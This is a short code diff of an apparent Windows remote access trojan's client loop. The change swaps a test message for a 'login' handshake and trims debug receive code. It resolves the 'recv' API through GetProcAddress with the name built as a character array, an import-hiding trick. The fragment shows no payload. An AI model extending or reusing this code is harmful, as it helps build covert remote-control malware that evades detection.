@@ -125,23 +125,12 @@ WinMain(HINSTANCE hInstance,
 		}
 	}
 
-	SocketSend(&ratSocket, "This is a test.");
+	SocketSend(&ratSocket, "login");
 
-	char ca_recv[] = { 'r','e','c','v',0 };
+	char ca_recv[] = { 'r','e','c','v', 0 };
 	_recv* f_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
 	char recvBuffer[SOCKET_BUFFER_SIZE];
-	if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
-	{
-		OutputDebugStringA("Error receiving message.");
-	}
-	OutputDebugStringA("Received: ");
-	OutputDebugStringA(recvBuffer);
-	OutputDebugStringA("\n");
-
-	Sleep(5000);
-	SocketSend(&ratSocket, "This is just a drill.");
-
 	if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
 	{
 		OutputDebugStringA("Error receiving message.");
